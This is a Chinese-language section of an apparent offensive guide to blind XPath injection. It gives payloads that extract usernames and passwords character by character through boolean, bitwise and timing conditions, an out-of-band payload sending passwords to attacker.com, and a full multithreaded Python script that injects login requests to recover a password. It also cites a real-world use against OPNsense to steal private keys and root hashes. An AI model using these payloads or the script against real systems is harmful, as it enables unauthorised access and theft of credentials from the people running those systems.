## 五、盲注数据提取

### 5.1 布尔盲注基础
```
# 判断根节点名称（页面差异即真/假）
' or name(/*)='users
' or starts-with(name(/*),'u')

# 逐字符提取
' or substring(//user[1]/username,1,1)='a
' or substring(//user[1]/password,1,1)='a

# 与运算合并条件（一次请求多条件）
' or (substring(//user[1]/password,1,1)='a' and string-length(//user[1]/password)=8) or '
```

### 5.2 高效提取：二分长度 + 字符集二分（实战首选）
```
# 长度二分（log2(300)≈9次请求）
' or string-length(//user[1]/password)>=150 or '

# 字符集二分（每次请求排除一半候选字符）
# 判断第pos位字符是否在候选子集half中：
' or contains('{half}', substring(//user[1]/password,{pos},1)) or '

# 例：候选串 "abcdefghijklmnopqrstuvwxyz" 取前13位判断
' or contains('abcdefghijklmn', substring(//user[1]/password,5,1)) or '
# 真 → 字符在前半，缩半继续；假 → 在后半
# 直至子集收缩到1个字符，再用精确相等确认
' or substring(//user[1]/password,5,1)='m' or '
```
**效率对比**：线性逐字符（约95次/字符）vs 字符集二分（约7次/字符）vs 长度二分（9次总长），大文本提取效率提升一个数量级。

### 5.3 位运算提取（XPath 2.0，每bit一个条件）
```
# 将字符的Unicode码点按bit拆解，7个布尔条件锁定一个ASCII字符
# fn:string-to-codepoints() 取得码点c，判断第k位：
' or (string-to-codepoints(substring(//user[1]/password,1,1))[1] mod 128)>=64 or '
' or (string-to-codepoints(substring(//user[1]/password,1,1))[1] mod 64)>=32 or '
# ... 依次用 mod/div 判断各位，7次请求=1字符
# 或直接码点二分：
' or string-to-codepoints(substring(//user[1]/password,1,1))[1]>=128 or '
```

### 5.4 时间盲注与超时外带
XPath 1.0本身无sleep函数，通过以下手段制造可观测延迟：
```
# 1) doc()访问不可达/过滤地址（连接超时）
' or doc-available(concat('http://10.0.0.1:81/', //user[1]/username)) or '
' or doc-available(concat('http://127.0.0.1:', //user/id)) or '

# 2) 大计算量（XQuery可用FLWOR构造重计算）
for $i in (1 to 10000000) return $i   # BaseX/eXist场景

# 3) XSLT处理器中利用扩展/慢路径（Saxon extension等）

# 判定：真→延迟N秒，假→立即返回
```

### 5.5 OAST外带（Out-of-Band，攻击者服务器收数据）
```
# 攻击者起HTTP/DNS监听，将提取值拼入URL带出
' or doc(concat('http://attacker.com/', //user[1]/password)) or '
# 每次带出一个值（密码整体）；逐字符则用substring

# XQuery环境可用外部HTTP库（http:send-request）
http:send-request(<http:request href="http://attacker/{...}"/>)
```

### 5.6 自动化提取脚本（Python，字符集二分+多线程）
```python
import requests, string
from concurrent.futures import ThreadPoolExecutor

target = "http://target.com/login"
charset = sorted(set(string.printable) - set("'\"\\\r\n\t"))
xpath = "//user[1]/password"

def probe(cond):
    payload = f"x' or ({cond}) or 'x'='"
    r = requests.post(target, data={"user": payload, "pass": "x"}, timeout=10)
    return "Login success" in r.text  # 依目标调整判定特征

# 1) 长度二分
lo, hi = 0, 512
while lo < hi:
    mid = (lo + hi + 1) // 2
    if probe(f"string-length({xpath})>={mid}"):
        lo = mid
    else:
        hi = mid - 1
length = lo
print(f"[*] length = {length}")

# 2) 逐字符：字符集二分（每个字符约log2(95)≈7次请求）
def extract(pos):
    cands = charset
    while len(cands) > 1:
        half = len(cands) // 2
        half_str = "".join(cands[:half])
        if probe(f"contains('{half_str}', substring({xpath},{pos},1))"):
            cands = cands[:half]
        else:
            cands = cands[half:]
    return cands[0]

with ThreadPoolExecutor(max_workers=8) as pool:  # 注意后端并发容忍度
    chars = list(pool.map(extract, range(1, length + 1)))
print("".join(chars))
```
**OPNsense真实利用参考**：CVE-2026-53582即采用"二分长度 + contains字符集二分 + 线程池并发"提取config.xml中WireGuard私钥/root密码哈希，全部请求仅依赖一次存储型注入点。

